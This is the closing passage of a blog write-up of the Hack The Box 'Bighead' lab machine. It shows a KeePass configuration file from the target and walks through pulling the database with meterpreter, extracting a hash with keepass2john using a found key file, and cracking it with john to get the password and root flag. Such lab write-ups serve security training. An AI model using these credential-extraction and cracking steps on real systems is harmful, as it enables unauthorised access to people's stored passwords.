class="name">Configuration</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Meta</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">PreferUserConfiguration</span>&gt;</span>false<span class="tag">&lt;/<span class="name">PreferUserConfiguration</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">OmitItemsWithDefaultValues</span>&gt;</span>true<span class="tag">&lt;/<span class="name">OmitItemsWithDefaultValues</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">DpiFactorX</span>&gt;</span>1<span class="tag">&lt;/<span class="name">DpiFactorX</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">DpiFactorY</span>&gt;</span>1<span class="tag">&lt;/<span class="name">DpiFactorY</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">Meta</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Application</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">LastUsedFile</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Path</span>&gt;</span>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier<span class="tag">&lt;/<span class="name">Path</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">CredProtMode</span>&gt;</span>Obf<span class="tag">&lt;/<span class="name">CredProtMode</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">CredSaveMode</span>&gt;</span>NoSave<span class="tag">&lt;/<span class="name">CredSaveMode</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">LastUsedFile</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">MostRecentlyUsed</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">MaxItemCount</span>&gt;</span>12<span class="tag">&lt;/<span class="name">MaxItemCount</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Items</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">ConnectionInfo</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">Path</span>&gt;</span>..\..\Users\Administrator\Desktop\chest.kdbx<span class="tag">&lt;/<span class="name">Path</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">CredProtMode</span>&gt;</span>Obf<span class="tag">&lt;/<span class="name">CredProtMode</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">CredSaveMode</span>&gt;</span>NoSave<span class="tag">&lt;/<span class="name">CredSaveMode</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">ConnectionInfo</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">Items</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">MostRecentlyUsed</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">WorkingDirectories</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Item</span>&gt;</span>Database@..\..\Users\Administrator\Desktop<span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Item</span>&gt;</span>KeyFile@..\..\Users\Administrator\Desktop<span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">WorkingDirectories</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Start</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">CheckForUpdate</span>&gt;</span>false<span class="tag">&lt;/<span class="name">CheckForUpdate</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">CheckForUpdateConfigured</span>&gt;</span>true<span class="tag">&lt;/<span class="name">CheckForUpdateConfigured</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">Start</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">FileOpening</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">FileClosing</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">TriggerSystem</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Triggers</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">TriggerSystem</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">PluginCompatibility</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">Application</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Logging</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">MainWindow</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">X</span>&gt;</span>2<span class="tag">&lt;/<span class="name">X</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Y</span>&gt;</span>2<span class="tag">&lt;/<span class="name">Y</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Width</span>&gt;</span>638<span class="tag">&lt;/<span class="name">Width</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Height</span>&gt;</span>450<span class="tag">&lt;/<span class="name">Height</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">SplitterHorizontalFrac</span>&gt;</span>0.8333<span class="tag">&lt;/<span class="name">SplitterHorizontalFrac</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">SplitterVerticalFrac</span>&gt;</span>0.25<span class="tag">&lt;/<span class="name">SplitterVerticalFrac</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Layout</span>&gt;</span>Default<span class="tag">&lt;/<span class="name">Layout</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ToolBar</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">EntryView</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">TanView</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">EntryListColumnCollection</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Column</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">Type</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">Type</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">Width</span>&gt;</span>90<span class="tag">&lt;/<span class="name">Width</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">Column</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Column</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">Type</span>&gt;</span>UserName<span class="tag">&lt;/<span class="name">Type</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">Width</span>&gt;</span>90<span class="tag">&lt;/<span class="name">Width</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">Column</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Column</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">Type</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">Type</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">Width</span>&gt;</span>90<span class="tag">&lt;/<span class="name">Width</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">HideWithAsterisks</span>&gt;</span>true<span class="tag">&lt;/<span class="name">HideWithAsterisks</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">Column</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Column</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">Type</span>&gt;</span>Url<span class="tag">&lt;/<span class="name">Type</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">Width</span>&gt;</span>90<span class="tag">&lt;/<span class="name">Width</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">Column</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Column</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">Type</span>&gt;</span>Notes<span class="tag">&lt;/<span class="name">Type</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">Width</span>&gt;</span>90<span class="tag">&lt;/<span class="name">Width</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">Column</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">EntryListColumnCollection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">EntryListColumnDisplayOrder</span>&gt;</span>0 1 2 3 4<span class="tag">&lt;/<span class="name">EntryListColumnDisplayOrder</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ListSorting</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Order</span>&gt;</span>Ascending<span class="tag">&lt;/<span class="name">Order</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ListSorting</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">MainWindow</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">UI</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">TrayIcon</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Hiding</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">StandardFont</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Family</span>&gt;</span>Microsoft Sans Serif<span class="tag">&lt;/<span class="name">Family</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Size</span>&gt;</span>8.25<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">GraphicsUnit</span>&gt;</span>Point<span class="tag">&lt;/<span class="name">GraphicsUnit</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Style</span>&gt;</span>Regular<span class="tag">&lt;/<span class="name">Style</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">OverrideUIDefault</span>&gt;</span>false<span class="tag">&lt;/<span class="name">OverrideUIDefault</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">StandardFont</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">PasswordFont</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Family</span>&gt;</span>Courier New<span class="tag">&lt;/<span class="name">Family</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Size</span>&gt;</span>8.25<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">GraphicsUnit</span>&gt;</span>Point<span class="tag">&lt;/<span class="name">GraphicsUnit</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Style</span>&gt;</span>Regular<span class="tag">&lt;/<span class="name">Style</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">OverrideUIDefault</span>&gt;</span>false<span class="tag">&lt;/<span class="name">OverrideUIDefault</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">PasswordFont</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">BannerStyle</span>&gt;</span>WinVistaBlack<span class="tag">&lt;/<span class="name">BannerStyle</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">DataEditorFont</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Family</span>&gt;</span>Microsoft Sans Serif<span class="tag">&lt;/<span class="name">Family</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Size</span>&gt;</span>8.25<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">GraphicsUnit</span>&gt;</span>Point<span class="tag">&lt;/<span class="name">GraphicsUnit</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Style</span>&gt;</span>Regular<span class="tag">&lt;/<span class="name">Style</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">OverrideUIDefault</span>&gt;</span>false<span class="tag">&lt;/<span class="name">OverrideUIDefault</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">DataEditorFont</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">UIFlags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">UIFlags</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">KeyCreationFlags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">KeyCreationFlags</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">KeyPromptFlags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">KeyPromptFlags</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">UI</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Security</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">WorkspaceLocking</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">LockAfterTime</span>&gt;</span>0<span class="tag">&lt;/<span class="name">LockAfterTime</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">LockAfterGlobalTime</span>&gt;</span>0<span class="tag">&lt;/<span class="name">LockAfterGlobalTime</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">WorkspaceLocking</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Policy</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">MasterPassword</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">MinimumLength</span>&gt;</span>0<span class="tag">&lt;/<span class="name">MinimumLength</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">MinimumQuality</span>&gt;</span>0<span class="tag">&lt;/<span class="name">MinimumQuality</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">MasterPassword</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">Security</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Native</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PasswordGenerator</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">AutoGeneratedPasswordsProfile</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">GeneratorType</span>&gt;</span>CharSet<span class="tag">&lt;/<span class="name">GeneratorType</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Length</span>&gt;</span>20<span class="tag">&lt;/<span class="name">Length</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">CharSetRanges</span>&gt;</span>ULD_______<span class="tag">&lt;/<span class="name">CharSetRanges</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">AutoGeneratedPasswordsProfile</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">LastUsedProfile</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">GeneratorType</span>&gt;</span>CharSet<span class="tag">&lt;/<span class="name">GeneratorType</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Length</span>&gt;</span>20<span class="tag">&lt;/<span class="name">Length</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">CharSetRanges</span>&gt;</span>ULD_______<span class="tag">&lt;/<span class="name">CharSetRanges</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">LastUsedProfile</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">UserProfiles</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">PasswordGenerator</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Defaults</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">OptionsTabIndex</span>&gt;</span>0<span class="tag">&lt;/<span class="name">OptionsTabIndex</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">SearchParameters</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ComparisonMode</span>&gt;</span>InvariantCultureIgnoreCase<span class="tag">&lt;/<span class="name">ComparisonMode</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">SearchParameters</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">KeySources</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">Association</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">DatabasePath</span>&gt;</span>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier<span class="tag">&lt;/<span class="name">DatabasePath</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">Password</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Password</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">KeyFilePath</span>&gt;</span>..\..\Users\Administrator\Pictures\admin.png<span class="tag">&lt;/<span class="name">KeyFilePath</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">Association</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">KeySources</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">Defaults</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Integration</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">HotKeyGlobalAutoType</span>&gt;</span>393281<span class="tag">&lt;/<span class="name">HotKeyGlobalAutoType:</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">HotKeySelectedAutoType</span>&gt;</span>0<span class="tag">&lt;/<span class="name">HotKeySelectedAutoType</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">HotKeyShowWindow</span>&gt;</span>393291<span class="tag">&lt;/<span class="name">HotKeyShowWindow</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">HotKeyEntryMenu</span>&gt;</span>0<span class="tag">&lt;/<span class="name">HotKeyEntryMenu</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">UrlSchemeOverrides</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">BuiltInOverridesEnabled</span>&gt;</span>1<span class="tag">&lt;/<span class="name">BuiltInOverridesEnabled</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">CustomOverrides</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">UrlSchemeOverrides</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">AutoTypeAbortOnWindows</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ProxyType</span>&gt;</span>System<span class="tag">&lt;/<span class="name">ProxyType</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ProxyAuthType</span>&gt;</span>Auto<span class="tag">&lt;/<span class="name">ProxyAuthType</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">Integration</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Custom</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Exactly here :<br><img src="/images/hackthebox/bighead/147.png" alt=""><br>The key is <code>admin.png</code> in <code>C:\Users\Administrator\Pictures\</code>. Let’s download it :<br><img src="/images/hackthebox/bighead/148.png" alt=""><br>admin.png :<br><img src="/images/hackthebox/bighead/admin.png" alt=""><br>I wanted to test the key (we still need the password) :<br><img src="/images/hackthebox/bighead/149.png" alt=""><br><img src="/images/hackthebox/bighead/150.png" alt=""><br>I expected <code>The composite key is invalid</code> but instead of that I got <code>The file version is unsupported</code>. I tried many other version of <code>keepass</code> and got the same error. So I was sure that the file itself was corrupted (maybe because of <code>more</code>). I downloaded it again with <code>meterpreter</code> itself this time :<br><img src="/images/hackthebox/bighead/151.png" alt=""><br>Then I renamed it to <code>db.kdbx</code> :<br><img src="/images/hackthebox/bighead/152.png" alt=""><br>Let’s try again :<br><img src="/images/hackthebox/bighead/153.png" alt=""><br><img src="/images/hackthebox/bighead/154.png" alt=""><br>Perfect ! Now we need the password. I used <code>keepass2john</code> to put the <code>kdbx</code> file in a <code>john</code> crackable format (we need the key to do that (<code>admin.png</code>))<br><code>keepass2john -k admin.png &gt; db.john</code><br><img src="/images/hackthebox/bighead/155.png" alt=""><br>Then I used <code>john</code> with <code>rockyou.txt</code> to crack it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt db.john</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/156.png" alt=""><br>The password is <code>darkness</code>. Let’s try to open the database :<br><img src="/images/hackthebox/bighead/157.png" alt=""><br><img src="/images/hackthebox/bighead/158.png" alt=""><br>Great ! double-click on <code>root.txt</code> and it will copy the flag into our clipboard :<br><img src="/images/hackthebox/bighead/159.png" alt=""><br>Let’s paste it :<br><img src="/images/hackthebox/bighead/160.png" alt=""><br>And finally we can say … We owned root !</p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/irked/">Hack The Box - Irked</a><br>Next Hack The Box write-up : <a href="/hack-the-box/lightweight/">Hack The Box - Lightweight</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-05-04</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/buffer-overflow/" rel="tag">#buffer-overflow</a> <a class="tag-link" href="/tags/code-analysis/" rel="tag">#code-analysis</a> <a class="tag-link" href="/tags/egghunting/" rel="tag">#egghunting</a> <a class="tag-link" href="/tags/exploit-development/" rel="tag">#exploit-development</a> <a class="tag-link" href="/tags/forensics/" rel="tag">#forensics</a> <a class="tag-link" href="/tags/lfi/" rel="tag">#lfi</a> <a class="tag-link" href="/tags/networking/" rel="tag">#networking</a> <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/pivoting/" rel="tag">#pivoting</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/reverse-engineering/" rel="tag">#reverse-engineering</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a> <a class="tag-link" href="/tags/windows/" rel="tag">#windows</a> <a class="tag-link" href="/tags/windows-exploitation/" rel="tag">#windows-exploitation</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
